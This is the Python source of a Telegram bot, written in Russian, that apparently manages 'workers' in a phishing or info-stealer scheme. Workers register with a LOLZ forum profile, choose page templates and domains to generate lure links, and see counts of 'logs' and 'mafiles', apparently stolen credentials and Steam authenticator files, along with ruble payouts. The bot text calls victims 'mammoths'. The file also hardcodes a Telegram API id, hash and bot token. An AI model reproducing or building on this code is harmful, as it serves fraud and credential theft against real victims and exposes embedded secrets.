import pyromod
import asyncio
from pyrogram import *
from pyrogram.types import *
from pyrogram.handlers import MessageHandler
from pyromod.helpers import ikb
from datetime import datetime, timedelta
import lbot
import re

app = Client(
    "my_bot",
    api_id="26134369",
    api_hash="3f84867554e3fe0dc743b16c7fc7dde1",
    bot_token="5998901106:AAEOOYDXEP-bYaYc8PmRccE7uMw9oI48bBI"
)

user_states = {}

answer_worked_before = ikb([
    [('✔Работал', '1'), ('❌Не работал', '0')]#,
    #[('Поддержка', 't.me/pyromodchat', 'url')]
])

info_text = """
🔎 Информация:

💬 Чат воркеров - [Вступить](https://t.me/+V_3Pm49AAKE4NGVi)
✅ Новости о канале - [Вступить](https://t.me/+ncFdxlr44N9jYzAy)
⏰ Отстук о логах/мафах - [Вступить](https://t.me/+H3IranCAEosyYTky)
💵 Выплаты на LOLZ воркерам - [Вступить](https://t.me/+VB3nLVr8wk44ZmRi)

📬 Мануалы - Прочитать

😘Удачи в поисках мамонтов!😘
"""

# Создаем клавиатуру
default_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton("🔎Инфо"),
            KeyboardButton("💼Профиль"),
            KeyboardButton("📎Ссылки")
        ],
        [
            KeyboardButton("🚑Поддержка"),
            KeyboardButton("📃Правила")
            # KeyboardButton("Настройки ⚙️")
        ]
    ],
    resize_keyboard=True
)

# Создаем клавиатуру
links_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton("🔎Мои ссылки"),
            KeyboardButton("📎Создать ссылку")
        ],
        [
            KeyboardButton("🚑Поддержка"),
            KeyboardButton("📃Правила"),
            KeyboardButton("/start")
        ]
    ],
    resize_keyboard=True
)

@app.on_message(filters.command("stop") & filters.private)
async def stop_proc(client, message):
    await app.send_message(message.chat.id, "Пока( 😥")

@app.on_message(filters.command("start") & filters.private)
async def main_proc(client, message):
    # Question
    if await lbot.check_first_start(message.chat.id):
        if message.chat.id not in user_states:
            question_wk = "Для начала ответим на вопросы, работали ли вы когда-нибудь раньше с этим?:"
            user_states[message.chat.id] = "waiting_answer"
            answer = await message.chat.ask(question_wk, message.chat.id, reply_markup=answer_worked_before)
            if user_states[message.chat.id] == "waiting_answer":
                del user_states[message.chat.id]
        else:
            await app.send_message(message.chat.id, "Воркаем пупсик!💋", reply_markup=default_keyboard)
    else:
        await app.send_message(message.chat.id, "Воркаем пупсик!💋", reply_markup=default_keyboard)

async def show_design(num, cht):
    datas = await lbot.get_design_list_names()
    dataid = await lbot.get_design_list_id()
    datalen = len(datas)
    num = await lbot.get_page_number(cht)
    # Создаем клавиатуру
    rpm = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("⬅️ Предыдущий", callback_data="design_previous"),
                InlineKeyboardButton("➡️ Следующий", callback_data=f"design_next_{datalen}")
            ],
            [
                InlineKeyboardButton("Выбрать шаблон", callback_data=f"design_select_{dataid[num]}")
                # InlineKeyboardButton("Назад", callback_data=f"back")
            ]
        ]
    )

    if datas:
        await app.send_message(cht, f"Название шаблона: {datas[num]}, id: {dataid[num]}", reply_markup=rpm)
    else:
        await app.send_message(cht, "Ошибка в API!", reply_markup=rpm)

async def show_dom(num, cht, sp):
    datas = await lbot.get_domains_list_names()
    dataid = await lbot.get_domains_list_id()
    datalen = len(datas)
    num = await lbot.get_page_number_dom(cht)
    # Создаем клавиатуру
    keydom = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("⬅️ Предыдущий", callback_data="domain_previous"),
                InlineKeyboardButton("➡️ Следующий", callback_data=f"domain_next_{datalen}")
            ],
            [
                InlineKeyboardButton("Выбрать шаблон", callback_data=f"domain_select_{dataid[num]}_d_{sp}")
                # InlineKeyboardButton("Назад", callback_data=f"back")
            ]
        ]
    )

    if datas:
        await app.send_message(cht, f"Название шаблона: {datas[num]}, id: {dataid[num]}", reply_markup=keydom)
    else:
        await app.send_message(cht, "Ошибка в API!")

@app.on_message(filters.private)
async def default_process(client, message):
    if message.text == "💼Профиль":
        user_data = await lbot.get_profile_data(message.chat.id)
        stats = await lbot.get_statistics_by_tg_id(message.chat.id)
        id, tg_id, join_date, first_start, url_lolz, worked_before, verified = user_data
        tg_id, balance, all_time_logs, mafiles = stats
        profile_message = f"""
📌 Профиль: {message.chat.username}
➖➖➖➖➖➖➖➖
📜 Логов: {all_time_logs}
🕵️‍♂️ Мафов: {mafiles}
➖➖➖➖➖➖➖➖
💰 Баланс: {balance}₽
📊 Всего логов за всё время: {all_time_logs}
➖➖➖➖➖➖➖➖
🔗 Ссылка на LOLZ: {url_lolz}
        """
        await app.send_message(message.chat.id, profile_message)
    
    if message.text == "🔎Инфо":
        info_message = "🔍Информация:"
        await app.send_message(message.chat.id, info_text)
    
    if message.text == "🔎Мои ссылки":
        links = await lbot.get_actual_links()
        if links:
            for domain_name, path_name, link_create_time in links:
                await app.send_message(message.chat.id, f"📎Ссылка: {domain_name}/{path_name}\n🕑Дата создания:{link_create_time}", reply_markup=links_keyboard)
    
    
    if message.text == "📎Ссылки":
        link_message = "**📎Мои ссылки**:"
        await app.send_message(message.chat.id, link_message, reply_markup=links_keyboard)
    
    if message.text == "📎Создать ссылку":
        cht = message.chat.id
        link_message = "**📎Ссылки**:"
        await lbot.set_page(cht, 0)
        await app.send_message(message.chat.id, link_message, reply_markup=links_keyboard)
        await show_design(await lbot.get_page_number(cht), cht)

@app.on_callback_query()
async def callback_handler(client, callback_query):
    button_data = callback_query.data
    # add proverka for callback by name
    if callback_query.from_user.id in user_states and user_states[callback_query.from_user.id] == "waiting_answer":
        # await callback_query.answer("Вы нажали кнопку: " + button_data) # Only on DEBUG
        user_states[callback_query.from_user.id] = "answered"

        if callback_query.from_user.id in user_states and user_states[callback_query.from_user.id] == "answered":
            # await app.send_message(callback_query.from_user.id, "OK!") # Complete
            question_wk = "Скиньте ссылку на ваш профиль LOLZ:"
            user_states[callback_query.from_user.id] = "waiting_answer"
            answer_url = await callback_query.message.chat.ask(question_wk, callback_query.from_user.id)
            #print(await lbot.checklink(str(answer_url.text)))

            if str(await lbot.checklink(str(answer_url.text))) == "200":
                if await lbot.create_user(str(callback_query.from_user.id), "0", str(button_data), str(answer_url.text)):
                    await app.send_message(callback_query.from_user.id, "Ваша заявка в скором времени будет разглянута, спасибо!", reply_markup=default_keyboard)
                else:
                    await app.send_message(callback_query.from_user.id, "Внутренняя ошибка сервера, попробуйте позже...")
            else:
                await app.send_message(callback_query.from_user.id, "Ваша ссылка недействительна.")

            if user_states[callback_query.from_user.id] == "waiting_answer":
                del user_states[callback_query.from_user.id]

    if button_data == "domain_previous":
        await lbot.decrease_page(callback_query.from_user.id)
        await show_dom(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Previous", show_alert=False)

    if "domain_next" in button_data:
        nump = int(button_data.replace("domain_next_", ""))
        await lbot.increase_page(callback_query.from_user.id, int(nump))
        await show_dom(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Next", show_alert=False)

    if "domain_select" in button_data:
        mes = await app.send_message(callback_query.from_user.id, "Домен выбран!")
        match = re.search(r"domain_select_(\d+)_d_(\d+)", button_data)
        if match:
            sel_id = button_data.replace("domain_select_", "")
            domain = match.group(1)
            design = match.group(2)
            # await app.send_message(callback_query.from_user.id, f"Вы выбрали {domain} id и {design}")
            answer = await mes.chat.ask('*📋Теперь напиши адрес (💡Например: "662423523632"):*', parse_mode=enums.ParseMode.MARKDOWN)
            await answer.request.edit_text("Адрес получен!")
            await answer.reply(f'Создание ссылки...', quote=True)
            if await lbot.create_link(design, domain, answer.text):
                await app.send_message(callback_query.from_user.id, "Ссылка создана успешно, зайдите в 'Мои ссылки'!")
            else:
                await app.send_message(callback_query.from_user.id, "Ошибка в создании ссылки!")
            await callback_query.answer("Selected", show_alert=False)
        else:
            print("No match found.")

    if button_data == "design_previous":
        await lbot.decrease_page(callback_query.from_user.id)
        await show_design(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Previous", show_alert=False)

    if "design_next" in button_data:
        nump = int(button_data.replace("design_next_", ""))
        await lbot.increase_page(callback_query.from_user.id, int(nump))
        await show_design(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Next", show_alert=False)

    if "design_select" in button_data:
        sel_id = button_data.replace("design_select_", "")
        await callback_query.answer("Selected", show_alert=False)
        await app.send_message(callback_query.from_user.id, f"Вы выбрали {sel_id} id")
        await lbot.set_page_dom(callback_query.from_user.id, 0)
        await show_dom(await lbot.get_page_number_dom(callback_query.from_user.id), callback_query.from_user.id, sel_id)

    # if "back" in button_data:
    #     await start_c(client, callback_query)

# app.add_handler(MessageHandler(onMessage))

if __name__ == '__main__':
    lbot.create_users_table()
    lbot.create_database()
    lbot.create_statistics_table()

    app.run()